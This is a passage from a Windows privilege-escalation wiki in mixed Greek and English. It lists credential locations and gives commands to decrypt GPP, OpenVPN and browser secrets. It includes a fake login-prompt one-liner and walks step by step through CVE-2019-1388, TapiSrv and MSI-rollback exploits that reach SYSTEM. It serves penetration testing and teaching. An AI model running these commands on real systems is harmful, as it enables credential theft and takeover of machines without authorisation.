Αν βρείτε οποιαδήποτε καταχώρηση μέσα σε αυτήν τη διαδρομή, πιθανότατα θα είναι αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινάει αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται πως αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την ασύμμετρη πιστοποίηση κλειδιού.

### Αρχεία χωρίς επίβλεψη
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος κωδικός GPP

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), που αποθηκεύονταν ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί εντός αυτών των GPP, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε επαληθευμένο χρήστη. Αυτό δημιουργούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά αποθηκευμένα αρχεία GPP που περιέχουν ένα πεδίο "cpassword" το οποίο δεν είναι κενό. Όταν βρεθεί ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα προσαρμοσμένο PowerShell αντικείμενο. Το αντικείμενο αυτό περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στον εντοπισμό και στην αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (προηγουμένως πριν από τα Windows Vista)_ για αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για να αποκτήσετε τα passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε τα credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα credentials του ή ακόμα και τα credentials ενός διαφορετικού χρήστη** αν νομίζετε ότι τα γνωρίζει (σημειώστε ότι το **να ζητήσετε** απευθείας από τον πελάτη τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζήτήστε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Πρέπει επίσης να ελέγξετε τον Κάδο Ανακύκλωσης για διαπιστευτήρια που βρίσκονται μέσα.

Για την **ανάκτηση κωδικών** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή openssh κλειδιών από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται κωδικοί από **Chrome ή Firefox**.\
Επίσης ελέγξτε το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς ίσως κάποιοι κωδικοί να είναι αποθηκευμένοι εκεί.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component είναι **ταυτοποιημένο μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργικότητα μέσω μίας ή περισσοτέρων διεπαφών, ταυτοποιούμενων μέσω interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry θα βρείτε το υπο-κλειδί **InProcServer32**, το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **overwrite any of the DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να **escalate privileges** αν αυτό το DLL εκτελεστεί από διαφορετικό χρήστη.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση για αρχείο με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο registry για key names και passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Δημιούργησα αυτό το plugin για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για να εξάγει password από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** από διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **το πώς να εντοπίσετε και να εκμεταλλευτείτε αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτό το **άλλο post για μια πιο πλήρη εξήγηση σχετικά με το πώς να δοκιμάσετε και να κακοποιήσετε περισσότερα open handlers διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα permissions (όχι μόνο full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**εδώ**](named-pipe-client-impersonation.md) and [**εδώ**](#from-high-integrity-to-system).

Επίσης το ακόλουθο εργαλείο επιτρέπει την παρεμβολή σε μια named pipe επικοινωνία με ένα εργαλείο όπως το burp: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει να λιστάρετε και να δείτε όλες τις pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν κώδικα στα Windows

Δείτε τη σελίδα **https://filesec.io/**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## Από χαμηλό προνόμιο χρήστη σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στη γραφική διεπαφή (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν χρήστη χωρίς προνόμια.

Αυτό καθιστά εφικτή την κλιμάκωση προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας, είναι υπογεγραμμένο και εκδίδεται από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διάβασε αυτό για να **μάθεις για τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα **διάβασε αυτό για να μάθεις σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στην κατάχρηση της λειτουργίας rollback του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά την διαδικασία απεγκατάστασης. Για αυτό ο επιτιθέμενος πρέπει να δημιουργήσει ένα **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να καταλάβει τον φάκελο `C:\Config.Msi`, ο οποίος αργότερα θα χρησιμοποιηθεί από τον Windows Installer για να αποθηκεύσει αρχεία rollback κατά την απεγκατάσταση άλλων MSI πακέτων, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Δημιούργησε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ., `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
- Σήμανε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να το τρέξει.
- Κράτησε έναν **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Step 2: Begin Uninstall
- Κάνε uninstall το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- **Poll the open file handle** χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Το `.msi` περιλαμβάνει μια **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Step 4: Block Deletion of `.rbf`
- Όταν σημειωθεί το σήμα, **άνοιξε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
- Έπειτα **σήμανε πίσω** ώστε η απεγκατάσταση να ολοκληρωθεί.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **ο φάκελος `C:\Config.Msi` δεν αφαιρείται**.

- Step 5: Manually Delete `.rbf`
- Εσύ (ο επιτιθέμενος) διαγράφεις το `.rbf` χειροκίνητα.
- Τώρα **ο φάκελος `C:\Config.Msi` είναι κενός**, έτοιμος για hijack.

> Σε αυτό το σημείο, **προκάλεσε την ευπάθεια διαγραφής φακέλου σε επίπεδο SYSTEM** για να διαγράψεις `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Επανέφερε τον φάκελο `C:\Config.Msi` μόνος σου.
- Θέσε **αδύναμα DACLs** (π.χ., Everyone:F), και **κράτησε έναν handle ανοιχτό** με `WRITE_DAC`.

- Step 7: Run Another Install
- Εγκατέστησε το `.msi` ξανά, με:
- `TARGETDIR`: Εγγράψιμη τοποθεσία.
- `ERROROUT`: Μια μεταβλητή που προκαλεί σκόπιμη αποτυχία.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, που διαβάζει `.rbs` και `.rbf`.

- Step 8: Monitor for `.rbs`
- Χρησιμοποίησε `ReadDirectoryChangesW` για να παρακολουθήσεις το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Κατέγραψε το όνομα του αρχείου.

- Step 9: Sync Before Rollback
- Το `.msi` περιέχει μια **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Step 10: Reapply Weak ACL
- Μετά τη λήψη του `'.rbs created'` event:
- Ο Windows Installer **επαναφέρει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά επειδή έχεις ακόμα έναν handle με `WRITE_DAC`, μπορείς να **επαναφέρεις ξανά αδύναμα ACLs**.

> Τα ACLs **εφαρμόζονται μόνο κατά το άνοιγμα του handle**, οπότε μπορείς ακόμα να γράψεις στον φάκελο.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Επικαλύπτεις το αρχείο `.rbs` με ένα **ψεύτικο rollback script** που λέει στα Windows να:
- Επαναφέρει το `.rbf` σου (malicious DLL) σε μια **προνομιούχο τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Τοποθετείς το ψεύτικο `.rbf` που περιέχει μια **κακόβουλη SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Σημαίνεις το sync event ώστε ο installer να συνεχίσει.
- Μια **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί να **αποτυγχάνει σκόπιμα την εγκατάσταση** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Ο Windows Installer:
- Διαβάζει το κακόβουλο `.rbs`.
- Αντιγράφει την `.rbf` DLL σου στην επιθυμητή τοποθεσία.
- Τώρα έχεις την **κακόβουλη DLL σε μια τοποθεσία που φορτώνεται από SYSTEM**.

- Final Step: Execute SYSTEM Code
- Τρέχεις ένα αξιόπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει τη DLL που κατέλαβες.
- Μπουμ: ο κώδικάς σου εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείς να διαγράψεις έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθεια σου επιτρέπει μόνο **arbitrary file deletion**;

Μπορείς να εκμεταλλευτείς τα εσωτερικά του NTFS: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός φακέλου, NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας standard file deletion APIs όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείτε ένα *file* delete API, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από Folder Contents Delete σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν σας επιτρέπει να διαγράψετε αυθαίρετα αρχεία/φακέλους, αλλά **σας επιτρέπει τη διαγραφή του *περιεχομένου* ενός attacker-controlled folder**;

1. Step 1: Στήστε έναν φάκελο δολώματος και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτό: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια διεργασία με προνόμια προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση της διαδικασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, το **oplock ενεργοποιείται** και παραδίδει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνησε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψεις το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
